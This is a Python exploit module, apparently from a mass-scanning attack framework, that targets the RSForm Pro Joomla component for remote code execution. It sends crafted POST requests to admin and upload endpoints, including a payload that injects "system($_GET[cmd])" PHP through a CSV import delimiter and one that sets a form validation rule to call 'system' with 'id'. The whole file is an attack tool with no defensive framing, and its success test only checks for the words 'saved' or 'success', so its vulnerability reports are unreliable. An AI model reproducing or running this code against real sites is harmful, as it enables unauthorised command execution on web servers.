import requests
from core.printmodels import *
import json

class RSForm_Pro_RCE:
    def __init__(self):
        self.name = "RSForm Pro RCE"
        self.description = "RSForm Pro Component Remote Code Execution (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            }

            payloads = [
                {
                    "option": "com_rsform",
                    "task": "forms.edit.element.save",
                    "formId": "1",
                    "componentType": "submitButton",
                    "ComponentIds": "1",
                    "form[VALIDATIONRULE]": "system",
                    "form[VALIDATIONEXTRA]": "id"
                },
                {
                    "option": "com_rsform",
                    "task": "submissions.importprocess",
                    "form": "1",
                    "import_type": "csv",
                    "delimiter": "';system($_GET[cmd]);'"
                }
            ]

            endpoints = [
                f"{site}/administrator/index.php",
                f"{site}/index.php?option=com_rsform",
                f"{site}/components/com_rsform/uploads/import.php"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, data=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('saved' in response.text or 'success' in response.text):
                        return PrintSuccess(f"[RSForm-Pro-2024] Vulnerable! RCE successful at {endpoint}")

            return PrintFailed("[RSForm-Pro-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[RSForm-Pro-2024] Error: {str(e)}")
